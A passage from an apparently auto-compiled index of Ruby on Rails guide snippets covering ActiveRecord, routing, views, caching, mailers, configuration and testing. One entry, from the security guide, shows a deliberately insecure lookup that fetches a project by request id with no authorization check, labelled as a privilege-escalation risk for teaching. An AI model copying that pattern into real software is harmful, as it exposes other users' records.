\"updated\" } }, xhr: true\n```\n\n----------------------------------------\n\nTITLE: Overriding model methods with pluck in Rails\nDESCRIPTION: Shows how `pluck` bypasses model method overrides, directly retrieving data from the database without applying custom logic defined in the model.  This can result in performance benefits but requires careful consideration when model methods are essential.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_196\n\nLANGUAGE: ruby\nCODE:\n```\nclass Customer < ApplicationRecord\n  def name\n    \"I am #{first_name}\"\n  end\nend\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> Customer.select(:first_name).map &:name\n=> [\"I am David\", \"I am Jeremy\", \"I am Jose\"]\n\nirb> Customer.pluck(:first_name)\n=> [\"David\", \"Jeremy\", \"Jose\"]\n```\n\n----------------------------------------\n\nTITLE: Rendering Partials with Locals\nDESCRIPTION: Demonstrates rendering a partial with specific local variables. This example shows how to pass the @article variable to the 'article' partial, as well as define a theme variable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_29\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/articles/show.html.erb %>\n<%= render partial: \"article\", layout: \"box\", locals: { article: @article } %>\n<%= render partial: \"article\", layout: \"box\", locals: { article: @article, theme: \"dark\" } %>\n```\n\n----------------------------------------\n\nTITLE: Configuring Solid Cache Store in Development\nDESCRIPTION: This snippet shows how to configure Solid Cache as the cache store in the development environment. It sets the `config.cache_store` option to `:solid_cache_store` within the `config/environments/development.rb` file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.cache_store = :solid_cache_store\n```\n\n----------------------------------------\n\nTITLE: Overriding Content-Security-Policy in a Rails Controller\nDESCRIPTION: This snippet demonstrates how to override the global Content-Security-Policy configuration for a specific controller in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_69\n\nLANGUAGE: ruby\nCODE:\n```\nclass PostsController < ApplicationController\n  content_security_policy do |policy|\n    policy.upgrade_insecure_requests true\n    policy.base_uri \"https://www.example.com\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Insecure Project Record Retrieval in Rails\nDESCRIPTION: An example of an insecure approach to fetching a record that could lead to privilege escalation. This code doesn't verify if the current user has authorization to access the requested project.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\n@project = Project.find(params[:id])\n```\n\n----------------------------------------\n\nTITLE: Including Namespaced Engine Stylesheets in ERB Templates\nDESCRIPTION: Shows how to include a namespaced stylesheet from a Rails engine into a view using the stylesheet_link_tag helper. This approach ensures proper asset loading while maintaining namespace separation between the engine and host application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_61\n\nLANGUAGE: erb\nCODE:\n```\n<%= stylesheet_link_tag \"blorgh/style.css\" %>\n```\n\n----------------------------------------\n\nTITLE: Implementing Authenticated Logo Controller in Ruby on Rails\nDESCRIPTION: This code snippet demonstrates how to create a custom authenticated controller for serving user logos. It includes route configuration and a controller action that redirects to the authenticated user's logo URL.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_49\n\nLANGUAGE: ruby\nCODE:\n```\n# config/routes.rb\nresource :account do\n  resource :logo\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/controllers/logos_controller.rb\nclass LogosController < ApplicationController\n  # Through ApplicationController:\n  # include Authenticate, SetCurrentAccount\n\n  def show\n    redirect_to Current.account.logo.url\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Audio Tag with Path in Rails\nDESCRIPTION: This code snippet demonstrates how to use the `audio_tag` helper with a specific path in Rails to generate an HTML5 `<audio>` tag. It loads the audio from the specified path relative to the `public/audios` directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_64\n\nLANGUAGE: erb\nCODE:\n```\n<%= audio_tag \"music/first_song.mp3\" %>\n```\n\n----------------------------------------\n\nTITLE: Moving middleware after another in Rails\nDESCRIPTION: Demonstrates moving a middleware (`Magical::Unicorns`) after another middleware (`ActionDispatch::Flash`) in the Rails middleware stack using `config.middleware.move_after`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.middleware.move_after ActionDispatch::Flash, Magical::Unicorns\n```\n\n----------------------------------------\n\nTITLE: Configuring Session Store with Cookie Store in Rails\nDESCRIPTION: This code snippet demonstrates how to configure the session store to use the cookie store and set a custom session key. The session_store setting is configured via a method call, allowing additional options to be passed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.session_store :cookie_store, key: \"_your_app_session\"\nconfig.session_options # => {key: \"_your_app_session\"}\n```\n\n----------------------------------------\n\nTITLE: Inferring Foreign Keys in Associations (Rails)\nDESCRIPTION: This demonstrates how Rails associations like `has_one` and `has_many` infer foreign keys using the `foreign_key` method. It shows the association's options to derive the correct key name.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_89\n\nLANGUAGE: ruby\nCODE:\n```\n# active_record/associations.rb\nforeign_key = options[:foreign_key] || reflection.active_record.name.foreign_key\n```\n\n----------------------------------------\n\nTITLE: Truncating Text with truncate in Ruby\nDESCRIPTION: Demonstrates various uses of the truncate helper to shorten text to a specified length with different options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\ntruncate(\"Once upon a time in a world far far away\")\n# => \"Once upon a time in a world...\"\n\ntruncate(\"Once upon a time in a world far far away\", length: 17)\n# => \"Once upon a ti...\"\n\ntruncate(\"one-two-three-four-five\", length: 20, separator: \"-\")\n# => \"one-two-three...\"\n\ntruncate(\"And they found that many people were sleeping better.\", length: 25, omission: \"... (continued)\")\n# => \"And they f... (continued)\"\n\ntruncate(\"<p>Once upon a time in a world far far away</p>\", escape: false)\n# => \"<p>Once upon a time in a wo...\"\n```\n\n----------------------------------------\n\nTITLE: Rails Generate and Destroy Commands\nDESCRIPTION: Example showing the Rails generate and destroy commands for creating and removing a model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_13\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate model Oops\n      invoke  active_record\n      create    db/migrate/20120528062523_create_oops.rb\n      create    app/models/oops.rb\n      invoke    test_unit\n      create      test/models/oops_test.rb\n      create      test/fixtures/oops.yml\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails destroy model Oops\n      invoke  active_record\n      remove    db/migrate/20120528062523_create_oops.rb\n      remove    app/models/oops.rb\n      invoke    test_unit\n      remove      test/models/oops_test.rb\n      remove      test/fixtures/oops.yml\n```\n\n----------------------------------------\n\nTITLE: Managing Autoload Paths in Rails 6\nDESCRIPTION: Example of properly configuring autoload paths without wildcards. This addresses an issue with nested directories and ensures that each autoload path represents the top-level namespace.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.autoload_paths << \"#{config.root}/lib\"\n```\n\n----------------------------------------\n\nTITLE: Assert Welcome Page Content - Ruby\nDESCRIPTION: This Ruby code snippet represents an integration test that checks if the welcome page is rendered correctly by asserting the presence of an h1 tag with the text \"Welcome#index\". It sends a GET request to the root path and then verifies the DOM structure.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_56\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass BlogFlowTest < ActionDispatch::IntegrationTest\n  test \"can see the welcome page\" do\n    get \"/\"\n    assert_dom \"h1\", \"Welcome#index\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Creating a User with ActiveRecord Callbacks\nDESCRIPTION: Illustrates the output when creating a user with the defined create callbacks. The logs show the sequence of events triggered by the before_create, around_create, and after_create callbacks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_12\n\nLANGUAGE: irb\nCODE:\n```\nirb> user = User.create(name: \"John Doe\", email: \"john.doe@example.com\")\n\nUser role set to default: user\nCreating user with email: john.doe@example.com\nUser created with email: john.doe@example.com\nUser welcome email sent to: john.doe@example.com\n=> #<User id: 10, email: \"john.doe@example.com\", created_at: \"2024-03-20 16:19:52.405195000 +0000\", updated_at: \"2024-03-20 16:19:52.405195000 +0000\", name: \"John Doe\">\n```\n\n----------------------------------------\n\nTITLE: Defining a simple after_create callback in Rails\nDESCRIPTION: This code snippet demonstrates how to define a simple `after_create` callback in a Rails model.  The callback logs a message using `Rails.logger` when a new `BirthdayCake` record is created.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nclass BirthdayCake < ApplicationRecord\n  after_create -> { Rails.logger.info(\"Congratulations, the callback has run!\") }\nend\n```\n\n----------------------------------------\n\nTITLE: Custom Attachment Partial ERB Template\nDESCRIPTION: This snippet demonstrates a custom partial to render an Action Text attachment, displaying a user's avatar and name. The User instance is available as the user partial-local variable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_15\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/users/_attachable.html.erb %>\n<span><%= image_tag user.avatar %> <%= user.name %></span>\n```\n\n----------------------------------------\n\nTITLE: macOS Service Management with Homebrew\nDESCRIPTION: Commands for installing dependencies with Homebrew Bundle, listing available services, and starting services individually on macOS.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/development_dependencies_install.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ brew bundle\n\n$ brew services list\n\n$ brew services start mysql\n```\n\n----------------------------------------\n\nTITLE: Changing Directories with inside\nDESCRIPTION: Demonstrates how to run commands from a specified directory using the `inside` method. The example creates a symlink within the `vendor` directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\ninside(\"vendor\") do\n  run \"ln -s ~/commit-rails/rails rails\"\nend\n```\n\n----------------------------------------\n\nTITLE: Fragment Caching in Rails Views\nDESCRIPTION: Demonstrates basic view fragment caching in Rails, including simple content caching and model-based caching. Shows how to cache partial renders and model-specific content.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_44\n\nLANGUAGE: erb\nCODE:\n```\n<% cache do %>\n  <%= render \"application/footer\" %>\n<% end %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<% @articles.each do |article| %>\n  <% cache article do %>\n    <%= render article %>\n  <% end %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: HTML Output of Year Select Box\nDESCRIPTION: This snippet shows the HTML output generated by the `select_year` helper in the previous example. It includes options for several years around the default value of 2024, with the 'selected' attribute applied to the 2024 option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_45\n\nLANGUAGE: html\nCODE:\n```\n<select id=\"party_year\" name=\"party[year]\">\n  <option value=\"2019\">2019</option>\n  <option value=\"2020\">2020</option>\n  <option value=\"2021\">2021</option>\n  <option value=\"2022\">2022</option>\n  <option value=\"2023\">2023</option>\n  <option value=\"2024\" selected=\"selected\">2024</option>\n  <option value=\"2025\">2025</option>\n  <option value=\"2026\">2026</option>\n  <option value=\"2027\">2027</option>\n  <option value=\"2028\">2028</option>\n  <option value=\"2029\">2029</option>\n</select>\n```\n\n----------------------------------------\n\nTITLE: Using the Article Model to Create and Archive Records - Rails Console - IRB\nDESCRIPTION: Demonstrates usage of the Article model in the Rails console: creating records, counting, and archiving an article (which changes its visibility in the view). Requires the view and model setup from previous snippets. Inputs are method calls with relevant parameters; outputs are changes in database records and count.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_22\n\nLANGUAGE: irb\nCODE:\n```\nirb> first = Article.create! title: \\\"Winter is coming\\\", status: \\\"published\\\", published_at: 1.year.ago\\nirb> second = Article.create! title: \\\"Brace yourself\\\", status: \\\"draft\\\", published_at: 1.month.ago\\n\\nirb> Article.count\\n=> 2\\nirb> first.archive!\\nirb> Article.count\\n=> 1\n```\n\n----------------------------------------\n\nTITLE: Using source_type with Polymorphic Associations\nDESCRIPTION: Shows how to use the :source_type option with a has_many :through association that proceeds through a polymorphic association. This allows specifying which type of polymorphic association to use as the source.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_114\n\nLANGUAGE: ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  has_many :books\n  has_many :paperbacks, through: :books, source: :format, source_type: \"Paperback\"\nend\n\nclass Book < ApplicationRecord\n  belongs_to :format, polymorphic: true\nend\n\nclass Hardback < ApplicationRecord; end\nclass Paperback < ApplicationRecord; end\n```\n\n----------------------------------------\n\nTITLE: Implementing Comments Controller Create Action (Ruby)\nDESCRIPTION: Defines the `create` action and a private `comment_params` method within the `Blorgh::CommentsController` (`app/controllers/blorgh/comments_controller.rb`). The action finds the parent article, creates a new comment associated with it using permitted parameters, sets a flash notice, and redirects back to the articles index path.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\ndef create\n  @article = Article.find(params[:article_id])\n  @comment = @article.comments.create(comment_params)\n  flash[:notice] = \"Comment has been created!\"\n  redirect_to articles_path\nend\n\nprivate\n  def comment_params\n    params.expect(comment: [:text])\n  end\n```\n\n----------------------------------------\n\nTITLE: EXPLAIN with Options Output (MySQL/MariaDB)\nDESCRIPTION: This is an example of the output generated by running `explain` with the `:analyze` option on MySQL or MariaDB. It shows a table with details about the query execution plan.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_218\n\nLANGUAGE: sql\nCODE:\n```\nANALYZE SELECT `shop_accounts`.* FROM `shop_accounts` INNER JOIN `customers` ON `customers`.`id` = `shop_accounts`.`customer_id` WHERE `shop_accounts`.`id` = 1\n+----+-------------+-------+------+---------------+------+---------+------+------+--------+----------+------------+--------------------------------+\n| id | select_type | table | type | possible_keys | key  | key_len | ref  | rows | r_rows | filtered | r_filtered | Extra                          |\n+----+-------------+-------+------+---------------+------+---------+------+------+--------+----------+------------+--------------------------------+\n|  1 | SIMPLE      | NULL  | NULL | NULL          | NULL | NULL    | NULL | NULL | NULL   | NULL     | NULL       | no matching row in const table |\n+----+-------------+-------+------+---------------+------+---------+------+------+--------+----------+------------+--------------------------------+\n1 row in set (0.00 sec)\n```\n\n----------------------------------------\n\nTITLE: Ordering Records with order in Rails\nDESCRIPTION: This snippet shows how to sort records by a specific column using the `order` method in ActiveRecord.  It generates a SQL `SELECT` query with an `ORDER BY` clause to sort products by name in ascending order. It returns an `ActiveRecord::Relation` object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_24\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> Product.order(name: :asc)\n  Product Load (0.3ms)  SELECT \"products\".* FROM \"products\" /* loading for pp */ ORDER BY \"products\".\"name\" ASC LIMIT 11 /*application='Store'*/\n=> [#<Product:0x0000000120e02a88 id: 2, name: \"Pants\", created_at: \"2024-11-09 16:36:01.856751000 +0000\", updated_at: \"2024-11-09 16:36:01.856751000 +0000\">,\n #<Product:0x0000000120e02948 id: 1, name: \"T-Shirt\", created_at: \"2024-11-09 16:35:01.117836000 +0000\", updated_at: \"2024-11-09 16:35:01.117836000 +0000\">]\n```\n\n----------------------------------------\n\nTITLE: after_touch with belongs_to association in Rails\nDESCRIPTION: Shows how to use `after_touch` in conjunction with a `belongs_to` association. When a `Book` is touched, it also triggers the `touch` method on its associated `Library`, which in turn executes the `after_touch` callback on both `Book` and `Library` models.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  belongs_to :library, touch: true\n  after_touch do\n    Rails.logger.info(\"A Book was touched\")\n  end\nend\n\nclass Library < ApplicationRecord\n  has_many :books\n  after_touch :log_when_books_or_library_touched\n\n  private\n    def log_when_books_or_library_touched\n      Rails.logger.info(\"Book/Library was touched\")\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Displaying the Featured Image - ERB\nDESCRIPTION: This snippet displays the featured image of a product in the `show` view using Active Storage. It uses the `image_tag` helper to generate an HTML `<img>` tag for the attached image, only if an image is attached to the product.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_86\n\nLANGUAGE: erb\nCODE:\n```\n<%= image_tag @product.featured_image if @product.featured_image.attached? %>\n```\n\n----------------------------------------\n\nTITLE: Rendering Model Instance Shorthand\nDESCRIPTION: This snippet showcases the shorthand syntax for rendering a model instance as a partial. Given an instance variable `@customer` of the `Customer` model, it will render the `_customer.html.erb` partial and pass the `@customer` instance variable as the local variable `customer` within that partial.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_83\n\nLANGUAGE: erb\nCODE:\n```\n<%= render @customer %>\n```\n\n----------------------------------------\n\nTITLE: Generating Rails Scaffold Controller Bash\nDESCRIPTION: Demonstrates generating a scaffold controller with associated tests in Rails. This command creates controller code and corresponding functional tests for a given resource (e.g., 'article').\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_37\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate scaffold_controller article\n```\n\n----------------------------------------\n\nTITLE: Using Capybara for HTML Testing with ActionView::TestCase\nDESCRIPTION: Demonstrates how to replace the default HTML parser with Capybara.string to utilize Capybara's testing capabilities in view tests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nregister_parser :html, -> rendered { Capybara.string(rendered) }\n\ntest \"renders HTML\" do\n  article = Article.create!(title: \"Hello, world\")\n\n  render partial: article\n\n  rendered_html.assert_css \"main h1\", text: \"Hello, world\"\nend\n```\n\n----------------------------------------\n\nTITLE: Allowing Optional Local Variables with Double Splat\nDESCRIPTION: Demonstrates how to allow optional local variable arguments using the double splat `**` operator. This enables passing additional attributes to HTML tags.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_37\n\nLANGUAGE: erb\nCODE:\n```\n<%# app/views/messages/_message.html.erb %>\n\n<%# locals: (message: \"Hello, world!\", **attributes) -%>\n<%= tag.p(message, **attributes) %>\n```\n\n----------------------------------------\n\nTITLE: Implementing after_action Callbacks in Rails Mailers\nDESCRIPTION: Demonstrates usage of after_action callbacks to modify delivery settings and handle business logic after mailer action execution.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\nclass UserMailer < ApplicationMailer\n  before_action { @business, @user = params[:business], params[:user] }\n\n  after_action :set_delivery_options,\n               :prevent_delivery_to_guests,\n               :set_business_headers\n\n  def feedback_message\n  end\n\n  def campaign_message\n  end\n\n  private\n    def set_delivery_options\n      if @business && @business.has_smtp_settings?\n        mail.delivery_method.settings.merge!(@business.smtp_settings)\n      end\n    end\n\n    def prevent_delivery_to_guests\n      if @user && @user.guest?\n        mail.perform_deliveries = false\n      end\n    end\n\n    def set_business_headers\n      if @business\n        headers[\"X-SMTPAPI-CATEGORY\"] = @business.code\n      end\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Translated Paths Using 'scope' in Rails\nDESCRIPTION: Shows how to alter path names generated by `resources` using `scope` and the `path_names` option. This allows you to create routes with translated path segments, such as `/kategorien/neu` instead of `/categories/new`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_76\n\nLANGUAGE: ruby\nCODE:\n```\nscope(path_names: { new: \"neu\", edit: \"bearbeiten\" }) do\n  resources :categories, path: \"kategorien\"\nend\n```\n\n----------------------------------------\n\nTITLE: Filtering Routes by Controller (bash)\nDESCRIPTION: Demonstrates using the `-c` option (controller) with `bin/rails routes` to filter routes by a specific controller. Useful for quickly identifying routes associated with a particular controller or namespace.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_84\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails routes -c users\n$ bin/rails routes -c admin/users\n$ bin/rails routes -c Comments\n$ bin/rails routes -c Articles::CommentsController\n```\n\n----------------------------------------\n\nTITLE: Accessing Rails Application Code in Rake Tasks\nDESCRIPTION: Shows how to create rake tasks that can access the Rails application code by depending on the environment task. This is necessary for tasks that need to interact with models and database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\ntask task_that_requires_app_code: [:environment] do\n  User.create!\nend\n```\n\n----------------------------------------\n\nTITLE: Setting Statement Limit in PostgreSQL Production (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to set the `statement_limit` option for a PostgreSQL database in the production environment. This limits the number of prepared statements per database connection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_92\n\nLANGUAGE: yaml\nCODE:\n```\nproduction:\n  adapter: postgresql\n  statement_limit: 200\n```\n\n----------------------------------------\n\nTITLE: Generated SQL for Specific Field Selection in Rails\nDESCRIPTION: The SQL generated by the `select` method demonstrates how to choose a subset of columns in the query. This can improve performance and reduce memory usage.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_85\n\nLANGUAGE: sql\nCODE:\n```\nSELECT isbn, out_of_print FROM books\n```\n\n----------------------------------------\n\nTITLE: Explicitly Using YAML URL Configuration (Bash + Ruby)\nDESCRIPTION: This Bash and Ruby snippet showcases how to explicitly configure a database connection using the `url` subkey in `config/database.yml`. This configuration will take precedence over any `ENV['DATABASE_URL']` settings. It then displays the final ActiveRecord configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_84\n\nLANGUAGE: Bash\nCODE:\n```\n$ cat config/database.yml\ndevelopment:\n  url: sqlite3:NOT_my_database\n\n$ echo $DATABASE_URL\npostgresql://localhost/my_database\n\n$ bin/rails runner 'puts ActiveRecord::Base.configurations.inspect'\n```\n\nLANGUAGE: Ruby\nCODE:\n```\n#<ActiveRecord::DatabaseConfigurations:0x00007fc8eab02880 @configurations=[\n  #<ActiveRecord::DatabaseConfigurations::UrlConfig:0x00007fc8eab020b0\n    @env_name=\"development\", @spec_name=\"primary\",\n    @config={\"adapter\"=>\"sqlite3\", \"database\"=>\"NOT_my_database\"}\n    @url=\"sqlite3:NOT_my_database\">\n  ]\n```\n\n----------------------------------------\n\nTITLE: Solid Queue Concurrency Control with Grouping\nDESCRIPTION: This Ruby snippet shows how to use the `group` parameter to control concurrency across different job types. Two different job classes (`Box::MovePostingsByContactToDesignatedBoxJob` and `Bundle::RebundlePostingsJob`) using the same group \"ContactActions\" will have their concurrency limited together.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_18\n\nLANGUAGE: Ruby\nCODE:\n```\nclass Box::MovePostingsByContactToDesignatedBoxJob < ApplicationJob\n  limits_concurrency key: ->(contact) { contact }, duration: 15.minutes, group: \"ContactActions\"\nend\n\nclass Bundle::RebundlePostingsJob < ApplicationJob\n  limits_concurrency key: ->(bundle) { bundle.contact }, duration: 15.minutes, group: \"ContactActions\"\nend\n```\n\n----------------------------------------\n\nTITLE: HTML output of simple select box\nDESCRIPTION: This HTML code shows the generated select box with city options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_32\n\nLANGUAGE: html\nCODE:\n```\n<select name=\"city\" id=\"city\">\n  <option value=\"Berlin\">Berlin</option>\n  <option value=\"Chicago\">Chicago</option>\n  <option value=\"Madrid\">Madrid</option>\n</select>\n```\n\n----------------------------------------\n\nTITLE: Running Rails Scaffold Generator After Template Override using Bash\nDESCRIPTION: Shows the command `bin/rails generate scaffold Post title:string` being executed. This demonstrates that the generator process now creates `app/views/posts/index.html.erb` using the custom template defined previously.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate scaffold Post title:string\n      ...\n      create      app/views/posts/index.html.erb\n      ...\n```\n\n----------------------------------------\n\nTITLE: Extracting Elements with extract! in Ruby\nDESCRIPTION: This shows the `extract!` method, which removes and returns elements from an array for which a block returns true. The original array is modified in place. Defined in `active_support/core_ext/array/extract.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_122\n\nLANGUAGE: ruby\nCODE:\n```\nnumbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\nodd_numbers = numbers.extract! { |number| number.odd? } # => [1, 3, 5, 7, 9]\nnumbers # => [0, 2, 4, 6, 8]\n```\n\n----------------------------------------\n\nTITLE: Adding Runtime Dependencies to an Engine's Gemspec\nDESCRIPTION: Shows how to specify a runtime dependency in an engine's gemspec file. This ensures the dependency will be installed when the engine is installed as a gem.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_64\n\nLANGUAGE: ruby\nCODE:\n```\ns.add_dependency \"moo\"\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Email Delivery Job in Ruby on Rails\nDESCRIPTION: Introduces MailDeliveryJob for delivering both regular and parameterized mail, replacing DeliveryJob and Parameterized::DeliveryJob.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/6_0_release_notes.md#2025-04-23_snippet_4\n\nLANGUAGE: Ruby\nCODE:\n```\nMailDeliveryJob\n```\n\n----------------------------------------\n\nTITLE: Products Controller with Destroy Action - Ruby\nDESCRIPTION: This Ruby snippet adds a `destroy` action to the `ProductsController` to handle the deletion of a product. It uses `before_action` to set the `@product` and then calls `@product.destroy` to delete the record. It relies on `set_product` before action to retrieve the `@product` instance.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_64\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  before_action :set_product, only: %i[ show edit update destroy ]\n\n  def index\n    @products = Product.all\n  end\n\n  def show\n  end\n\n  def new\n    @product = Product.new\n  end\n\n  def create\n    @product = Product.new(product_params)\n    if @product.save\n      redirect_to @product\n    else\n      render :new, status: :unprocessable_entity\n    end\n  end\n\n  def edit\n  end\n\n  def update\n    if @product.update(product_params)\n      redirect_to @product\n    else\n      render :edit, status: :unprocessable_entity\n    end\n  end\n\n  def destroy\n    @product.destroy\n    redirect_to products_path\n  end\n\n  private\n    def set_product\n      @product = Product.find(params[:id])\n    end\n\n    def product_params\n      params.expect(product: [ :name ])\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Adding Google Cloud Storage Gem Dependency (Bundler, Ruby)\nDESCRIPTION: Specifies the addition of the google-cloud-storage gem to the Gemfile using Bundler, required for Active Storage to interface with Google Cloud Storage. The gem version is constrained to 1.11 or higher, and it is not automatically required at boot. This step is essential before configuring GCS services in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\ngem \"google-cloud-storage\", \"~> 1.11\", require: false\n```\n\n----------------------------------------\n\nTITLE: Setting Additional Action Mailer Options in Ruby\nDESCRIPTION: This code snippet shows how to set additional options for Action Mailer, such as the `from` address, by assigning a hash to `config.action_mailer.default_options`. This is useful for specifying default values for all mailers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_59\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_mailer.default_options = {\n  from: \"noreply@example.com\"\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Formats in Rails Rendering\nDESCRIPTION: This snippet shows how to set the formats for rendering in Rails. The `:formats` option can be a symbol or an array of symbols. If a template with the specified format does not exist, an ActionView::MissingTemplate error is raised.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\nrender formats: :xml\n```\n\nLANGUAGE: ruby\nCODE:\n```\nrender formats: [:json, :xml]\n```\n\n----------------------------------------\n\nTITLE: Joining Nested Associations (Multiple Levels) in Rails\nDESCRIPTION: This snippet shows how to join multiple levels of nested associations starting from `Author`. It joins `Author` with `books`, then `books` with `reviews`, `reviews` with `customer`, `customer` with `orders`, and `books` with `supplier`. The SQL query reflects these multiple joins using INNER JOIN clauses.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_142\n\nLANGUAGE: ruby\nCODE:\n```\nAuthor.joins(books: [{ reviews: { customer: :orders } }, :supplier])\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT authors.* FROM authors\n  INNER JOIN books ON books.author_id = authors.id\n  INNER JOIN reviews ON reviews.book_id = books.id\n  INNER JOIN customers ON customers.id = reviews.customer_id\n  INNER JOIN orders ON orders.customer_id = customers.id\nINNER JOIN suppliers ON suppliers.id = books.supplier_id\n```\n\n----------------------------------------\n\nTITLE: Inserting a Breakpoint with `debugger` in Ruby (debug gem)\nDESCRIPTION: Shows how to insert a breakpoint in Ruby code using the `debugger` keyword (an alias for `binding.break`). When the application execution reaches this line, it pauses and enters an interactive debugging session provided by the `debug` gem. This example places the breakpoint within a Rails controller 